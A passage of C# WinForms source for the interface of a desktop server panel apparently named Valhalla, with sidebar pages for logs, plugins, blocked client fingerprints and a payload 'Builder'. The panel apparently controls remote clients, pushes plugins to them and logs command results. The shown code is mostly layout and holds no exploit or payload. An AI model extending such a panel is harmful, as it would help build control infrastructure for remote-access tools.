            return SendPluginRaw(connectionId, "CMD:PLUGIN_END:" + transferId, "PLUGIN_END:" + transferId);
        }

        private bool BeginPluginReceive(string connectionId, string transferId, string fileName, long length, string sha256) { return true; }
        private bool CompletePluginReceive(string connectionId, string transferId) { return true; }

        private void InitializeAdditionalNavigationPages()
        {
            autoTasksTabPage = new DevExpress.XtraTab.XtraTabPage();
            autoTasksTabPage.Name = "autoTasksTabPage";
            autoTasksTabPage.Text = "Auto Tasks";
            autoTasksTabPage.BackColor = ColorTranslator.FromHtml("#262626");

            notificationsTabPage = new DevExpress.XtraTab.XtraTabPage();
            notificationsTabPage.Name = "notificationsTabPage";
            notificationsTabPage.Text = "Notifications";
            notificationsTabPage.BackColor = ColorTranslator.FromHtml("#262626");

            serverLogsTabPage = CreateBlankNavigationPage("serverLogsTabPage", "Server Logs");

            pluginManagerTabPage = CreateBlankNavigationPage("pluginManagerTabPage", "Plugin Manager");
            blockedConnectionsTabPage = CreateBlankNavigationPage("blockedConnectionsTabPage", "Blocked Connections");

            xtraTabControl1.TabPages.Add(autoTasksTabPage);
            xtraTabControl1.TabPages.Add(notificationsTabPage);
            xtraTabControl1.TabPages.Add(serverLogsTabPage);
            xtraTabControl1.TabPages.Add(pluginManagerTabPage);
            xtraTabControl1.TabPages.Add(blockedConnectionsTabPage);

            autoTasksNavigationElement = CreateNavigationItem("autoTasksNavigationElement", "Auto Tasks");
            autoTasksNavigationElement.Click += autoTasksNavigationElement_Click;

            notificationsNavigationElement = CreateNavigationItem("notificationsNavigationElement", "Notifications");
            notificationsNavigationElement.Click += notificationsNavigationElement_Click;

            serverLogsNavigationElement = CreateNavigationItem("serverLogsNavigationElement", "Server Logs");
            serverLogsNavigationElement.Click += delegate { NavigateToSidebarPage(serverLogsNavigationElement, serverLogsTabPage); };

            pluginManagerNavigationElement = CreateNavigationItem("pluginManagerNavigationElement", "Plugin Manager");
            pluginManagerNavigationElement.Click += delegate { NavigateToSidebarPage(pluginManagerNavigationElement, pluginManagerTabPage); };

            blockedConnectionsNavigationElement = CreateNavigationItem("blockedConnectionsNavigationElement", "Blocked Connections");
            blockedConnectionsNavigationElement.Click += delegate { NavigateToSidebarPage(blockedConnectionsNavigationElement, blockedConnectionsTabPage); };

            systemNavigationGroup = accordionControlElement9;
            systemNavigationGroup.Text = "System";
            systemNavigationGroup.Expanded = true;
            systemNavigationGroup.Elements.Clear();
            systemNavigationGroup.Elements.Add(notificationsNavigationElement);
            systemNavigationGroup.Elements.Add(serverLogsNavigationElement);
            systemNavigationGroup.Elements.Add(pluginManagerNavigationElement);

            accordionControlElement1.Elements.Add(blockedConnectionsNavigationElement);
            ConfigureSidebarItemAppearance(systemNavigationGroup);
            ConfigureSidebarItemAppearance(accordionControlElement1);

            ApplySidebarIcons();
        }

        private DevExpress.XtraTab.XtraTabPage CreateBlankNavigationPage(string name, string text)
        {
            DevExpress.XtraTab.XtraTabPage page = new DevExpress.XtraTab.XtraTabPage();
            page.Name = name;
            page.Text = text;
            page.BackColor = ColorTranslator.FromHtml("#262626");
            return page;
        }

        private void InitializeServerLogsPage()
        {
            serverLogsTabPage.Text = "Server Logs";
            serverLogsTabPage.BackColor = ColorTranslator.FromHtml("#262626");

            Panel header = new Panel
            {
                Dock = DockStyle.Top,
                Height = 112,
                BackColor = Color.FromArgb(38, 38, 38),
                Padding = new Padding(0)
            };
            Label title = new Label
            {
                Text = "Server Logs",
                AutoSize = true,
                ForeColor = Color.White,
                Font = new Font("Tahoma", 9.75F, FontStyle.Bold),
                Location = new Point(17, 23)
            };
            Label subtitle = new Label
            {
                Text = "Connection and command results",
                AutoSize = true,
                ForeColor = Color.FromArgb(224, 224, 224),
                Font = new Font("Tahoma", 9.75F, FontStyle.Regular),
                Location = new Point(18, 51)
            };
            header.Controls.Add(title);
            header.Controls.Add(subtitle);

            Panel tableHeader = new Panel
            {
                Dock = DockStyle.Bottom,
                Height = 36,
                BackColor = Color.FromArgb(31, 33, 34),
                Padding = new Padding(0)
            };
            Label valueHeader = new Label
            {
                Text = "Value",
                Dock = DockStyle.Left,
                TextAlign = ContentAlignment.MiddleLeft,
                ForeColor = Color.FromArgb(224, 224, 224),
                Font = new Font("Tahoma", 9.75F, FontStyle.Regular)
            };
            Label statusHeader = new Label
            {
                Text = "Status",
                Dock = DockStyle.Right,
                TextAlign = ContentAlignment.MiddleLeft,
                ForeColor = Color.FromArgb(224, 224, 224),
                Font = new Font("Tahoma", 9.75F, FontStyle.Regular)
            };
            Panel headerDivider = new Panel
            {
                Dock = DockStyle.Bottom,
                Height = 1,
                BackColor = Color.FromArgb(82, 86, 86)
            };
            tableHeader.Controls.Add(statusHeader);
            tableHeader.Controls.Add(valueHeader);
            tableHeader.Controls.Add(headerDivider);
            tableHeader.Resize += delegate
            {
                int half = Math.Max(1, tableHeader.ClientSize.Width / 2);
                valueHeader.Width = half;
                statusHeader.Width = tableHeader.ClientSize.Width - half;
            };
            header.Controls.Add(tableHeader);

            serverLogsGrid = new DataGridView
            {
                Dock = DockStyle.Fill,
                BackgroundColor = Color.FromArgb(20, 20, 20),
                BorderStyle = BorderStyle.None,
                CellBorderStyle = DataGridViewCellBorderStyle.None,
                ColumnHeadersVisible = false,
                RowHeadersVisible = false,
                AllowUserToAddRows = false,
                AllowUserToDeleteRows = false,
                AllowUserToResizeRows = false,
                AllowUserToResizeColumns = false,
                AutoGenerateColumns = false,
                MultiSelect = false,
                ReadOnly = true,
                SelectionMode = DataGridViewSelectionMode.FullRowSelect,
                EnableHeadersVisualStyles = false,
                RowTemplate = { Height = 30 },
                Name = "serverLogsGrid"
            };
            serverLogsGrid.DefaultCellStyle.BackColor = Color.FromArgb(20, 20, 20);
            serverLogsGrid.DefaultCellStyle.SelectionBackColor = Color.FromArgb(20, 20, 20);
            serverLogsGrid.DefaultCellStyle.SelectionForeColor = Color.White;
            serverLogsGrid.DefaultCellStyle.Font = new Font("Consolas", 9F);
            serverLogsGrid.DefaultCellStyle.Padding = new Padding(14, 0, 14, 0);
            serverLogsGrid.RowTemplate.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleLeft;

            DataGridViewTextBoxColumn valueColumn = new DataGridViewTextBoxColumn
            {
                Name = "Value",
                HeaderText = "Value",
                AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill,
                FillWeight = 50F,
                MinimumWidth = 120,
                SortMode = DataGridViewColumnSortMode.NotSortable
            };
            DataGridViewTextBoxColumn statusColumn = new DataGridViewTextBoxColumn
            {
                Name = "Status",
                HeaderText = "Status",
                AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill,
                FillWeight = 50F,
                MinimumWidth = 120,
                SortMode = DataGridViewColumnSortMode.NotSortable
            };
            serverLogsGrid.Columns.Add(valueColumn);
            serverLogsGrid.Columns.Add(statusColumn);
            serverLogsGrid.CellPainting += delegate(object sender, DataGridViewCellPaintingEventArgs e)
            {
                if (e.RowIndex < 0 || e.ColumnIndex < 0)
                    return;

                e.PaintBackground(e.CellBounds, false);
                string text = Convert.ToString(e.FormattedValue) ?? string.Empty;
                Rectangle textRect = new Rectangle(
                    e.CellBounds.X + 14,
                    e.CellBounds.Y + 1,
                    Math.Max(0, e.CellBounds.Width - 28),
                    Math.Max(0, e.CellBounds.Height - 2));
                TextFormatFlags flags = TextFormatFlags.Left | TextFormatFlags.VerticalCenter |
                    TextFormatFlags.NoPrefix | TextFormatFlags.EndEllipsis;
                Color foreColor = e.CellStyle.ForeColor.IsEmpty ? Color.White : e.CellStyle.ForeColor;
                TextRenderer.DrawText(e.Graphics, text, serverLogsGrid.Font, textRect, foreColor, flags);
                e.Handled = true;
            };
            serverLogsGrid.SelectionChanged += delegate { serverLogsGrid.ClearSelection(); };

            serverLogsTabPage.Controls.Add(serverLogsGrid);
            serverLogsTabPage.Controls.Add(header);
        }

        private void InitializeBlockedConnectionsPage()
        {
            blockedConnectionsTabPage.Text = "Blocked Connections";
            blockedConnectionsTabPage.BackColor = ColorTranslator.FromHtml("#262626");
            blockedConnectionsTabPage.Padding = new Padding(0);

            blockedConnectionsGrid = new DevExpress.XtraGrid.GridControl
            {
                Dock = DockStyle.Fill,
                Name = "blockedConnectionsGrid"
            };
            blockedConnectionsGridView = new DevExpress.XtraGrid.Views.Grid.GridView(blockedConnectionsGrid);
            blockedConnectionsGrid.MainView = blockedConnectionsGridView;
            blockedConnectionsGrid.ViewCollection.Add(blockedConnectionsGridView);
            blockedConnectionsGridView.OptionsBehavior.Editable = false;
            blockedConnectionsGridView.OptionsSelection.EnableAppearanceFocusedCell = false;
            blockedConnectionsGridView.OptionsSelection.EnableAppearanceFocusedRow = true;
            blockedConnectionsGridView.OptionsSelection.MultiSelect = true;
            blockedConnectionsGridView.OptionsSelection.MultiSelectMode = DevExpress.XtraGrid.Views.Grid.GridMultiSelectMode.RowSelect;
            blockedConnectionsGridView.FocusRectStyle = DevExpress.XtraGrid.Views.Grid.DrawFocusRectStyle.RowFocus;
            blockedConnectionsGridView.OptionsView.ShowGroupPanel = false;
            blockedConnectionsGridView.OptionsView.ColumnAutoWidth = false;
            blockedConnectionsGridView.RowHeight = 34;
            blockedConnectionsGridView.RowStyle += delegate(object sender, DevExpress.XtraGrid.Views.Grid.RowStyleEventArgs e)
            {
                if (e.RowHandle >= 0 && blockedConnectionsGridView.IsRowSelected(e.RowHandle))
                {
                    e.Appearance.BackColor = ColorTranslator.FromHtml("#1A2028");
                    e.Appearance.ForeColor = Color.White;
                    e.HighPriority = true;
                }
            };

            blockedConnectionsTable = new DataTable("BlockedConnections");
            blockedConnectionsTable.Columns.Add("IP", typeof(string));
            blockedConnectionsTable.Columns.Add("UserName", typeof(string));
            blockedConnectionsTable.Columns.Add("Fingerprint", typeof(string));
            blockedConnectionsGrid.DataSource = blockedConnectionsTable;

            blockedConnectionsPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
            {
                Name = "blockedConnectionsPopupMenu",
                MinWidth = ContextParentMenuWidth
            };
            blockedConnectionsAddItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Add")
            {
                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
            };
            blockedConnectionsRemoveItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Remove")
            {
                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
            };
            blockedConnectionsAddItem.ImageOptions.Image = null;
            blockedConnectionsAddItem.ImageOptions.SvgImage = null;
            blockedConnectionsRemoveItem.ImageOptions.Image = null;
            blockedConnectionsRemoveItem.ImageOptions.SvgImage = null;
            blockedConnectionsAddItem.ItemClick += delegate { ShowAddBlockedFingerprintDialog(); };
            blockedConnectionsRemoveItem.ItemClick += delegate { RemoveSelectedBlockedConnection(); };
            blockedConnectionsPopupMenu.AddItem(blockedConnectionsAddItem);
            blockedConnectionsPopupMenu.AddItem(blockedConnectionsRemoveItem);

            blockedConnectionsGrid.MouseDown += BlockedConnectionsGrid_MouseDown;
            blockedConnectionsGridView.RowClick += BlockedConnectionsGridView_RowClick;
            blockedConnectionsGrid.MouseUp += delegate(object sender, MouseEventArgs e)
            {
                if (e.Button == MouseButtons.Right && blockedConnectionsPopupMenu != null)
                    blockedConnectionsPopupMenu.ShowPopup(Control.MousePosition);
            };

            blockedConnectionsTabPage.Controls.Add(blockedConnectionsGrid);
            ReloadBlockedConnectionsGrid();
        }

        private void BlockedConnectionsGrid_MouseDown(object sender, MouseEventArgs e)
        {
            blockedMouseDownFingerprint = string.Empty;
            blockedMouseDownWasSelected = false;

            if (e.Button != MouseButtons.Left || blockedConnectionsGridView == null)
                return;

            DevExpress.XtraGrid.Views.Grid.ViewInfo.GridHitInfo hit =
                blockedConnectionsGridView.CalcHitInfo(e.Location);

            if (hit.InRow && hit.RowHandle >= 0)
            {
                blockedMouseDownFingerprint = Convert.ToString(
                    blockedConnectionsGridView.GetRowCellValue(hit.RowHandle, "Fingerprint"));
                blockedMouseDownWasSelected = blockedConnectionsGridView.IsRowSelected(hit.RowHandle);
                return;
            }

            if (hit.HitTest == GridHitTest.EmptyRow)
                blockedConnectionsGridView.ClearSelection();
        }

        private void BlockedConnectionsGridView_RowClick(object sender, DevExpress.XtraGrid.Views.Grid.RowClickEventArgs e)
        {
            if (e.RowHandle < 0 || e.Button != MouseButtons.Left)
                return;

            if (!blockedMouseDownWasSelected || string.IsNullOrWhiteSpace(blockedMouseDownFingerprint))
                return;

            string fingerprint = blockedMouseDownFingerprint;
            BeginInvoke(new Action(() => UnselectBlockedConnectionByFingerprint(fingerprint)));
        }

        private void UnselectBlockedConnectionByFingerprint(string fingerprint)
        {
            if (IsDisposed || !IsHandleCreated || blockedConnectionsGridView == null || string.IsNullOrWhiteSpace(fingerprint))
                return;

            int[] selectedRows = blockedConnectionsGridView.GetSelectedRows();
            if (selectedRows == null)
                return;

            foreach (int rowHandle in selectedRows)
            {
                if (rowHandle < 0)
                    continue;

                string selectedFingerprint = Convert.ToString(
                    blockedConnectionsGridView.GetRowCellValue(rowHandle, "Fingerprint"));
                if (string.Equals(selectedFingerprint, fingerprint, StringComparison.OrdinalIgnoreCase))
                {
                    blockedConnectionsGridView.UnselectRow(rowHandle);
                    break;
                }
            }

            if (blockedConnectionsGridView.GetSelectedRows().Length == 0)
                blockedConnectionsGridView.FocusedRowHandle = DevExpress.XtraGrid.GridControl.InvalidRowHandle;
        }

        private void ReloadBlockedConnectionsGrid()
        {
            if (blockedConnectionsTable == null)
                return;

            blockedConnectionsTable.Rows.Clear();
            foreach (BlockedConnectionRecord record in blockedConnectionStore.GetAll())
            {
                DataRow row = blockedConnectionsTable.NewRow();
                row["IP"] = record.Ip;
                row["UserName"] = record.UserName;
                row["Fingerprint"] = record.Fingerprint;
                blockedConnectionsTable.Rows.Add(row);
            }

            if (blockedConnectionsGridView != null)
            {
                if (blockedConnectionsGridView.Columns["IP"] != null)
                {
                    blockedConnectionsGridView.Columns["IP"].Caption = "IP Address";
                    blockedConnectionsGridView.Columns["IP"].Width = 205;
                }
                if (blockedConnectionsGridView.Columns["UserName"] != null)
                {
                    blockedConnectionsGridView.Columns["UserName"].Caption = "User Name";
                    blockedConnectionsGridView.Columns["UserName"].Width = 250;
                }
                if (blockedConnectionsGridView.Columns["Fingerprint"] != null)
                {
                    blockedConnectionsGridView.Columns["Fingerprint"].Caption = "Fingerprint";
                    blockedConnectionsGridView.Columns["Fingerprint"].Width = 300;
                }

                blockedConnectionsGridView.CustomColumnDisplayText -= BlockedConnectionsGridView_CustomColumnDisplayText;
                blockedConnectionsGridView.CustomColumnDisplayText += BlockedConnectionsGridView_CustomColumnDisplayText;
                blockedConnectionsGridView.ClearSelection();
                blockedConnectionsGridView.FocusedRowHandle = DevExpress.XtraGrid.GridControl.InvalidRowHandle;
            }
        }

        private void BlockedConnectionsGridView_CustomColumnDisplayText(object sender, DevExpress.XtraGrid.Views.Base.CustomColumnDisplayTextEventArgs args)
        {
            if (args.Value == null)
                return;

            if (args.Column != null && args.Column.FieldName == "Fingerprint")
            {
                string value = Convert.ToString(args.Value);
                if (value.Length > 16)
                    args.DisplayText = value.Substring(0, 16) + "...";
            }
        }

        private void ShowAddBlockedFingerprintDialog()
        {
            const int width = 480;
            const int height = 188;
            using (Form dialog = new Form())
            {
                dialog.Text = "Add Blocked Connection";
                dialog.StartPosition = FormStartPosition.CenterParent;
                dialog.FormBorderStyle = FormBorderStyle.FixedDialog;
                dialog.MinimizeBox = false;
                dialog.MaximizeBox = false;
                dialog.ShowInTaskbar = false;
                dialog.ClientSize = new Size(width, height);
                dialog.BackColor = Color.FromArgb(35, 37, 38);
                dialog.ForeColor = Color.White;
                dialog.Font = new Font("Segoe UI", 9F);

                Label label = new Label
                {
                    Text = "Fingerprint",
                    AutoSize = true,
                    ForeColor = Color.FromArgb(239, 242, 241),
                    Location = new Point(24, 24)
                };
                DevExpress.XtraEditors.TextEdit input = new DevExpress.XtraEditors.TextEdit
                {
                    Name = "blockedFingerprintInput",
                    Location = new Point(24, 52),
                    Size = new Size(432, 30),
                    Properties = { NullValuePrompt = "Input a fingerprint to block", NullValuePromptShowForEmptyValue = true },
                    BackColor = Color.FromArgb(31, 33, 34),
                    ForeColor = Color.White
                };
                Button cancel = new Button
                {
                    Text = "Cancel",
                    DialogResult = DialogResult.Cancel,
                    FlatStyle = FlatStyle.Flat,
                    Location = new Point(265, 112),
                    Size = new Size(88, 32),
                    BackColor = Color.FromArgb(48, 50, 51),
                    ForeColor = Color.White
                };
                cancel.FlatAppearance.BorderColor = Color.FromArgb(70, 74, 74);
                Button ok = new Button
                {
                    Text = "OK",
                    FlatStyle = FlatStyle.Flat,
                    Location = new Point(368, 112),
                    Size = new Size(88, 32),
                    BackColor = Color.FromArgb(48, 50, 51),
                    ForeColor = Color.White
                };
                ok.FlatAppearance.BorderColor = Color.FromArgb(70, 74, 74);
                ok.Click += delegate
                {
                    string fingerprint = BlockedConnectionStore.NormalizeFingerprint(input.Text);
                    if (fingerprint.Length == 0)
                    {
                        MessageBox.Show(dialog, "Enter a valid 64-character fingerprint.", "Blocked Connection", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }
                    blockedConnectionStore.Add(fingerprint, "Unknown", "Unknown");
                    lock (connectionStateLock)
                    {
                        blockedConnectionRejectionLogged.Remove(fingerprint);
                    }
                    ReloadBlockedConnectionsGrid();
                    LogServerEvent("Fingerprint blocked: " + fingerprint, LogType.Warning);
                    dialog.DialogResult = DialogResult.OK;
                    dialog.Close();
                };

                dialog.Controls.Add(label);
                dialog.Controls.Add(input);
                dialog.Controls.Add(cancel);
                dialog.Controls.Add(ok);
                dialog.AcceptButton = ok;
                dialog.CancelButton = cancel;
                dialog.ShowDialog(this);
            }
        }

        private void RemoveSelectedBlockedConnection()
        {
            if (blockedConnectionsGridView == null)
                return;
            int rowHandle = blockedConnectionsGridView.FocusedRowHandle;
            if (rowHandle < 0)
                return;

            string fingerprint = Convert.ToString(blockedConnectionsGridView.GetRowCellValue(rowHandle, "Fingerprint"));
            if (BlockedConnectionStore.NormalizeFingerprint(fingerprint).Length == 0)
                return;

            if (blockedConnectionStore.Remove(fingerprint))
            {
                lock (connectionStateLock)
                {
                    blockedConnectionRejectionLogged.Remove(fingerprint);
                }
                ReloadBlockedConnectionsGrid();
                LogServerEvent("Fingerprint unblocked: " + fingerprint, LogType.Success);
            }
        }

        private void BlockSelectedConnections()
        {
            int[] rows = gridView == null ? new int[0] : gridView.GetSelectedRows();
            foreach (int rowHandle in rows)
            {
                if (rowHandle < 0)
                    continue;

                string fingerprint = Convert.ToString(gridView.GetRowCellValue(rowHandle, "Fingerprint"));
                fingerprint = BlockedConnectionStore.NormalizeFingerprint(fingerprint);
                if (fingerprint.Length == 0)
                {
                    LogServerEvent("Block failed: connection has no valid fingerprint", LogType.Error);
                    continue;
                }

                string connectionId = Convert.ToString(gridView.GetRowCellValue(rowHandle, "ConnectionId"));
                string ip = Convert.ToString(gridView.GetRowCellValue(rowHandle, "IP"));
                string userName = Convert.ToString(gridView.GetRowCellValue(rowHandle, "UserName"));
                blockedConnectionStore.Add(fingerprint, ip, userName);
                CloseConnectionById(connectionId, "Connection blocked");
                LogServerEvent("Connection blocked: " + fingerprint, LogType.Warning);
            }
            ReloadBlockedConnectionsGrid();
        }

        private void CloseConnectionById(string connectionId, string reason)
        {
            if (string.IsNullOrWhiteSpace(connectionId))
                return;

            TcpClient client = null;
            lock (connectionStateLock)
            {
                connectedClients.TryGetValue(connectionId, out client);
            }
            if (client == null)
                return;

            try { client.Close(); } catch { }
        }

        private DevExpress.XtraBars.Navigation.AccordionControlElement CreateNavigationItem(string name, string text)
        {
            DevExpress.XtraBars.Navigation.AccordionControlElement item = new DevExpress.XtraBars.Navigation.AccordionControlElement();
            item.Name = name;
            item.Text = text;
            item.Style = DevExpress.XtraBars.Navigation.ElementStyle.Item;
            return item;
        }

        private int GetCurrentDpi()
        {
            int dpi = DeviceDpi;
            return dpi > 0 ? dpi : 96;
        }

        private static int ScaleLogicalPixels(int logicalPixels, int dpi)
        {
            return Math.Max(1, (int)Math.Round(logicalPixels * dpi / 96.0, MidpointRounding.AwayFromZero));
        }

        private void ApplySidebarLayoutForDpi(int dpi, bool forceExpandedWidth)
        {
            if (accordionControl1 == null)
                return;

            // DevExpress/FluentDesignForm owns the collapsed navigation width. Only
            // impose our 240-logical-pixel target when the rail is expanded; otherwise
            // preserve the control's collapsed state instead of accidentally forcing it
            // back open during a monitor-DPI transition.
            if (forceExpandedWidth)
                accordionControl1.Width = ScaleLogicalPixels(SidebarWidth, dpi);

            accordionControl1.GroupHeight = ScaleLogicalPixels(SidebarGroupHeight, dpi);
            accordionControl1.ItemHeight = ScaleLogicalPixels(SidebarItemHeight, dpi);

            // FluentDesignForm/WinForms docking calculates the fill container's
            // position from the left-docked navigation control. We intentionally do
            // not force an absolute Location here.
            if (fluentDesignFormContainer1 != null && fluentDesignFormContainer1.Dock != DockStyle.Fill)
                fluentDesignFormContainer1.Dock = DockStyle.Fill;
        }

        protected override void OnDpiChanged(DpiChangedEventArgs e)
        {
            base.OnDpiChanged(e);

            int expandedThreshold = ScaleLogicalPixels(200, e.DeviceDpiNew);
            bool navigationIsExpanded = accordionControl1 != null && accordionControl1.Width >= expandedThreshold;
            ApplySidebarLayoutForDpi(e.DeviceDpiNew, navigationIsExpanded);

            // Rebind the small vector navigation icons at the new DPI so their
            // configured SvgImageSize remains crisp instead of bitmap-scaled.
            ApplySidebarIcons();
            Invalidate(true);
        }

        private void ConfigureSidebarAppearance()
        {
            // Keep the accordion itself responsible for its own background.  The
            // hamburger header is a real part of the AccordionControl, so painting
            // the parent control and the header to the same color prevents the skin
            // from exposing a separate black strip above the navigation items.
            accordionControl1.AllowHtmlText = false;
            ApplySidebarLayoutForDpi(GetCurrentDpi(), true);
            accordionControl1.ViewType = DevExpress.XtraBars.Navigation.AccordionControlViewType.Standard;
            accordionControl1.ScrollBarMode = DevExpress.XtraBars.Navigation.ScrollBarMode.Default;
            accordionControl1.BackColor = SidebarBackgroundColor;
            accordionControl1.ForeColor = Color.White;

            accordionControlElement1.Text = "Dashboard";
            accordionControlElement5.Text = "Builder";
            accordionControlElement9.Text = "System";
            ConfigureSidebarGroupAppearance(accordionControlElement1);
            ConfigureSidebarGroupAppearance(accordionControlElement5);
            ConfigureSidebarGroupAppearance(accordionControlElement9);
            ConfigureSidebarItemAppearance(accordionControlElement1);
            ConfigureSidebarItemAppearance(accordionControlElement5);
            ConfigureSidebarItemAppearance(accordionControlElement9);
            ApplySidebarIcons();
        }

        private void ConfigureSidebarGroupAppearance(DevExpress.XtraBars.Navigation.AccordionControlElement group)
        {
            if (group == null) return;
            Font groupFont = new Font("Segoe UI Semibold", 10.0F, FontStyle.Bold, GraphicsUnit.Point);
            group.Appearance.Normal.BackColor = SidebarBackgroundColor;
            group.Appearance.Normal.ForeColor = Color.White;
            group.Appearance.Normal.Font = groupFont;
            group.Appearance.Normal.Options.UseBackColor = true;
            group.Appearance.Normal.Options.UseForeColor = true;
            group.Appearance.Normal.Options.UseFont = true;
            group.Appearance.Hovered.BackColor = SidebarBackgroundColor;
            group.Appearance.Hovered.ForeColor = Color.White;
            group.Appearance.Hovered.Font = groupFont;
            group.Appearance.Hovered.Options.UseBackColor = true;
            group.Appearance.Hovered.Options.UseForeColor = true;
            group.Appearance.Hovered.Options.UseFont = true;
            group.Appearance.Pressed.BackColor = SidebarBackgroundColor;
            group.Appearance.Pressed.ForeColor = Color.White;
            group.Appearance.Pressed.Font = groupFont;
            group.Appearance.Pressed.Options.UseBackColor = true;
            group.Appearance.Pressed.Options.UseForeColor = true;
            group.Appearance.Pressed.Options.UseFont = true;
        }

        private void ConfigureSidebarItemAppearance(DevExpress.XtraBars.Navigation.AccordionControlElement group)
        {
            if (group == null) return;
            foreach (DevExpress.XtraBars.Navigation.AccordionControlElement child in group.Elements)
            {
                if (child == null || child.Style != DevExpress.XtraBars.Navigation.ElementStyle.Item) continue;
                child.Appearance.Normal.ForeColor = SidebarItemTextColor;
                child.Appearance.Normal.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                child.Appearance.Normal.Options.UseForeColor = true;
                child.Appearance.Normal.Options.UseFont = true;
                child.Appearance.Hovered.ForeColor = Color.White;
                child.Appearance.Hovered.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                child.Appearance.Hovered.Options.UseForeColor = true;
                child.Appearance.Hovered.Options.UseFont = true;
                child.Appearance.Pressed.ForeColor = Color.White;
                child.Appearance.Pressed.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                child.Appearance.Pressed.Options.UseForeColor = true;
                child.Appearance.Pressed.Options.UseFont = true;
            }
        }

        private void AccordionControl1_CustomDrawElement(object sender, DevExpress.XtraBars.Navigation.CustomDrawElementEventArgs e)
        {
            if (e == null || e.Element == null)
                return;

            Rectangle header = e.ObjectInfo.HeaderBounds;
            int lineLeft = ScaleLogicalPixels(SidebarMenuHorizontalInset, GetCurrentDpi());
            int lineRight = Math.Max(lineLeft + 24, accordionControl1.ClientSize.Width - ScaleLogicalPixels(SidebarContentRightPadding, GetCurrentDpi()));
            int lineY = header.Bottom - 7;

            if (e.Element.Style == DevExpress.XtraBars.Navigation.ElementStyle.Group)
            {
                e.Handled = true;
                e.DrawHeaderBackground();
                e.ObjectInfo.PaintAppearance.ForeColor = Color.White;
                e.ObjectInfo.PaintAppearance.Font = new Font("Segoe UI Semibold", 10.0F, FontStyle.Bold, GraphicsUnit.Point);
                e.ObjectInfo.PaintAppearance.Options.UseForeColor = true;
                e.ObjectInfo.PaintAppearance.Options.UseFont = true;
                e.DrawImage();
                e.DrawText();
                e.DrawExpandCollapseButton();

                // Keep the rule and selected surface clear of the group's native
                // expand/collapse button at the far right. The item hit-test area
                // remains full-width; only the painted surface is inset.
                using (Pen pen = new Pen(Color.FromArgb(106, 108, 108), 1f))
                    e.Cache.DrawLine(pen, new Point(lineLeft, lineY), new Point(lineRight, lineY));
                return;
            }

            if (e.Element.Style == DevExpress.XtraBars.Navigation.ElementStyle.Item)
            {
                // Fully own the item surface so the Fluent skin cannot paint its native
                // hover/shadow adorner across the entire AccordionControl width. The
                // hover/selected surface is deliberately clipped to the same horizontal
                // bounds used by the category divider lines.
                e.Handled = true;

                Rectangle itemBounds = new Rectangle(
                    lineLeft,
                    header.Top,
                    Math.Max(0, lineRight - lineLeft),
                    header.Height);

                Point cursor = accordionControl1.PointToClient(Control.MousePosition);
                bool isHovered = header.Contains(cursor);
                bool isSelected = e.Element == accordionControl1.SelectedElement;

                if (isSelected)
                {
                    e.Cache.FillRectangle(SidebarAccentColor, itemBounds);
                }
                else if (isHovered)
                {
                    // Subtle in-bounds hover tint; no native shadow is allowed to escape
                    // the same right edge as the category divider.
                    e.Cache.FillRectangle(Color.FromArgb(57, 55, 56), itemBounds);
                }
                else
                {
                    e.Cache.FillRectangle(SidebarBackgroundColor, itemBounds);
                }

                e.ObjectInfo.PaintAppearance.ForeColor = Color.White;
                e.ObjectInfo.PaintAppearance.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                e.ObjectInfo.PaintAppearance.Options.UseForeColor = true;
                e.ObjectInfo.PaintAppearance.Options.UseFont = true;
                e.DrawImage();
                e.DrawText();
                return;
            }
        }

        private void ApplySidebarIcons()
        {
            DisposeSidebarIcons();
            AssignSidebarIcon(accordionControlElement1, "sidebar_dashboard.svg");
            AssignSidebarIcon(accordionControlElement2, "sidebar_connections.svg");
            AssignSidebarIcon(accordionControlElement3, "sidebar_server.svg");
            AssignSidebarIcon(accordionControlElement6, "sidebar_build.svg");
            AssignSidebarIcon(accordionControlElement7, "sidebar_convert.svg");
            AssignSidebarIcon(accordionControlElement5, "sidebar_builder.svg");
            AssignSidebarIcon(accordionControlElement9, "sidebar_system.svg");
            AssignSidebarIcon(notificationsNavigationElement, "sidebar_notifications.svg");
            AssignSidebarIcon(serverLogsNavigationElement, "sidebar_notifications.svg");
            AssignSidebarIcon(pluginManagerNavigationElement, "sidebar_plugin_manager.svg");
            AssignSidebarIcon(blockedConnectionsNavigationElement, "sidebar_blocked.svg");

        }

        private void AssignSidebarIcon(DevExpress.XtraBars.Navigation.AccordionControlElement element, string fileName)
        {
            if (element == null) return;
            SvgImage image = LoadUiSvgImage(fileName);
            sidebarIconImages.Add(image);
            element.ImageOptions.Image = null;
            element.ImageOptions.SvgImage = image;
            element.ImageOptions.SvgImageSize = new Size(
                ScaleLogicalPixels(SidebarIconSize, GetCurrentDpi()),
                ScaleLogicalPixels(SidebarIconSize, GetCurrentDpi()));
            element.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.None;
        }

        private static string GetUiIconPath(string fileName)
        {
            return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "resources", fileName);
        }

        private static SvgImage LoadUiSvgImage(string fileName)
        {
            string path = GetUiIconPath(fileName);
            if (!File.Exists(path))
                throw new FileNotFoundException("Required Valhalla UI icon was not deployed.", path);

            using (FileStream stream = File.OpenRead(path))
                return SvgImage.FromStream(stream);
        }

        private static void DisposeSvgImages(List<SvgImage> images)
        {
            foreach (SvgImage image in images)
            {
                IDisposable disposable = image as IDisposable;
                if (disposable != null)
                    disposable.Dispose();
            }
            images.Clear();
        }

        private void DisposeSidebarIcons()
        {
            DisposeSvgImages(sidebarIconImages);
        }

        private void DisposeUiIconImages()
        {
            DisposeSidebarIcons();
            DisposeSvgImages(connectionMenuIconImages);
        }

